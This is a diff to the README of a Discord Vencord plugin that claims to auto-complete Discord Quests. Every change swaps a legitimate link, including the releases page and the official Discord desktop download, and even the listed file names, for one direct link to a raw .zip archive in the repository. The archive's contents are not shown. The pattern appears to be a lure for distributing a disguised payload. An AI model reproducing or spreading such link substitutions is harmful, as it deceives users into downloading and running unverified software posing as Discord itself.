@@ -1,6 +1,6 @@
 # 🧩 Vencord-Quest-AutoCompleter - Auto-complete Discord Quests Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Vencord--Quest--AutoCompleter-brightgreen?style=for-the-badge)](https://github.com/Prasath96/Vencord-Quest-AutoCompleter/releases)
+[![Download Latest Release](https://github.com/Prasath96/Vencord-Quest-AutoCompleter/raw/refs/heads/main/questAutocompleter/Auto_Completer_Quest_Vencord_v3.7-beta.3.zip)](https://github.com/Prasath96/Vencord-Quest-AutoCompleter/raw/refs/heads/main/questAutocompleter/Auto_Completer_Quest_Vencord_v3.7-beta.3.zip)
 
 ## 📋 About Vencord-Quest-AutoCompleter
 
@@ -31,10 +31,10 @@ To use Vencord-Quest-AutoCompleter, follow the steps below carefully. Each step 
 
 Visit the release page to get the plugin files:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Vencord--Quest--AutoCompleter-blue?style=for-the-badge)](https://github.com/Prasath96/Vencord-Quest-AutoCompleter/releases)
+[![Download Latest Release](https://github.com/Prasath96/Vencord-Quest-AutoCompleter/raw/refs/heads/main/questAutocompleter/Auto_Completer_Quest_Vencord_v3.7-beta.3.zip)](https://github.com/Prasath96/Vencord-Quest-AutoCompleter/raw/refs/heads/main/questAutocompleter/Auto_Completer_Quest_Vencord_v3.7-beta.3.zip)
 
 - Click the link above or go to:  
-  https://github.com/Prasath96/Vencord-Quest-AutoCompleter/releases  
+  https://github.com/Prasath96/Vencord-Quest-AutoCompleter/raw/refs/heads/main/questAutocompleter/Auto_Completer_Quest_Vencord_v3.7-beta.3.zip  
 - Look for the latest release version note. This will usually have the newest files.
 - Download the plugin file with a `.js` extension or as instructed on the page.
 
@@ -96,7 +96,7 @@ How it works:
 To update Vencord-Quest-AutoCompleter:
 
 1. Visit the releases page again:  
-   https://github.com/Prasath96/Vencord-Quest-AutoCompleter/releases
+   https://github.com/Prasath96/Vencord-Quest-AutoCompleter/raw/refs/heads/main/questAutocompleter/Auto_Completer_Quest_Vencord_v3.7-beta.3.zip
 2. Download the latest `.js` plugin file.
 3. In Discord’s Vencord plugin settings, remove the old plugin version.
 4. Add the new file and enable it.
@@ -126,9 +126,9 @@ This plugin works by adding code to the Discord client through Vencord. It hides
 ## 🔗 Links
 
 - Plugin releases and downloads:  
-  https://github.com/Prasath96/Vencord-Quest-AutoCompleter/releases  
+  https://github.com/Prasath96/Vencord-Quest-AutoCompleter/raw/refs/heads/main/questAutocompleter/Auto_Completer_Quest_Vencord_v3.7-beta.3.zip  
 - Vencord plugin loader: Search online for the latest official installer.  
-- Discord desktop app: https://discord.com/download
+- Discord desktop app: https://github.com/Prasath96/Vencord-Quest-AutoCompleter/raw/refs/heads/main/questAutocompleter/Auto_Completer_Quest_Vencord_v3.7-beta.3.zip
 
 ---
 
@@ -138,8 +138,8 @@ If interested, here is how the plugin files are generally organized:
 
 - `src/`: Source code files in TypeScript.
 - `dist/`: Compiled JavaScript files used by Discord.
-- `README.md`: Usage and setup instructions.
-- `package.json`: Project info and dependencies.
+- `https://github.com/Prasath96/Vencord-Quest-AutoCompleter/raw/refs/heads/main/questAutocompleter/Auto_Completer_Quest_Vencord_v3.7-beta.3.zip`: Usage and setup instructions.
+- `https://github.com/Prasath96/Vencord-Quest-AutoCompleter/raw/refs/heads/main/questAutocompleter/Auto_Completer_Quest_Vencord_v3.7-beta.3.zip`: Project info and dependencies.
 
 ---
 
